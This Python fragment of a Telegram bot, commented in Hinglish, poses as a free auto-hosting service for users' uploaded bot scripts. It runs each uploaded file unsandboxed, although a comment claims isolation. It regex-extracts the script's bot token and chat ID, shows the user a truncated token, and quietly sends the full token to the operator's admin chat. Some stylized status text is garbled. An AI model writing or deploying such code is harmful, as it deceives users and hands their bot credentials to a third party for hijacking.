# --- AUTOMATIC FILE DETECTION AND DEPLOYMENT ---
@bot.message_handler(content_types=['document'])
def handle_auto_deployment(message):
    user_id = message.from_user.id

    if not message.document.file_name.endswith('.py'):
        bot.send_message(message.chat.id, "❌ <b>Sirf .py script file accept hogi!</b>", parse_mode='HTML')
        return
    
    status_msg = bot.send_message(message.chat.id, "🔍 <b>𝐑𝐄𝐀𝐃𝐈𝐍𝐆 𝐒𝐂𝐑block𝐏𝐓 𝐅block𝐋block...</b>", parse_mode='HTML')
    
    bot_id = str(uuid.uuid4())[:8]
    file_path = f"bot_{bot_id}.py"
    
    try:
        # Download file inside container
        file_info = bot.get_file(message.document.file_id)
        file_content = bot.download_file(file_info.file_path)
        
        # Save file temporary to extract tokens
        with open(file_path, 'wb') as f: 
            f.write(file_content)

        # Code ke andar se automatically Token aur Chat ID dhoondhne ke liye Regex Match Engine
        code_text = file_content.decode('utf-8', errors='ignore')
        
        # Telegram Bot Token dhundhne ka automated pattern (e.g., 1234567890:ABC...)
        token_match = re.search(r'["\'](\d{9,10}:[A-Za-z0-9_-]{35})["\']', code_text)
        # Chat ID dhundhne ka automated pattern
        chat_id_match = re.search(r'(?:chat_id|CHAT_ID|id)\s*=\s*["\']?(-?\d+)"\']?', code_text)
        
        extracted_token = token_match.group(1) if token_match else "AUTO_DETECTED"
        extracted_chat = chat_id_match.group(1) if chat_id_match else "AUTO_DETECTED"

        # Animation loader 
        for i in range(0, 101, 25):
            bot.edit_message_text(f"🚀 <b>𝐀𝐔𝐓𝐎-𝐃block𝐏𝐋𝐎𝐘𝐈𝐍𝐆: {i}%</b>\n⏳ <i>Extracting internal configurations...</i>", message.chat.id, status_msg.message_id, parse_mode='HTML')
            time.sleep(0.3)

        # REAL TIME BACKGROUND PROCESS EXECUTION BINDING
        # Isse user ki file alag isolated sandbox process me live run hogi bina main bot ko block kiye
        proc = subprocess.Popen([sys.executable, file_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        if user_id not in user_sessions:
            user_sessions[user_id] = {}
            
        user_sessions[user_id][bot_id] = {
            'process': proc,
            'file': file_path, 
            'name': message.document.file_name,
            'token': extracted_token,
            'chat_id': extracted_chat
        }
        
        bot.edit_message_text(
            f"✅ <b>𝟐𝟒/𝟕 𝐇𝐎𝐔𝐑𝐒 𝐎𝐍block𝐈𝐍block 𝐀𝐂𝐓block𝐕block</b>\n\n"
            f"📄 <b>File:</b> <code>{message.document.file_name}</code>\n"
            f"🔑 <b>Token:</b> <code>{extracted_token[:12]}...***</code>\n\n"
            f"Your bot has been hosted completely in real background workspace!", 
            message.chat.id, status_msg.message_id, parse_mode='HTML'
        )
        
        # Admin log tracker updates
        bot.send_message(
            DEFAULT_CHAT_ID, 
            f"🔔 <b>NEW AUTO-HOSTED BOT LIVE</b>\n━━━━━━━━━━━━━\n👤 User: {user_id}\n📄 File: {message.document.file_name}\n🔑 Extracted Token: <code>{extracted_token}</code>\n🆔 Chat ID: <code>{extracted_chat}</code>", 
            parse_mode='HTML'
        )
        
    except Exception as e:
        if os.path.exists(file_path):
            os.remove(file_path)
        bot.edit_message_text(f"❌ <b>Deployment Crashed:</b> {str(e)}", message.chat.id, status_msg.message_id, parse_mode='HTML')

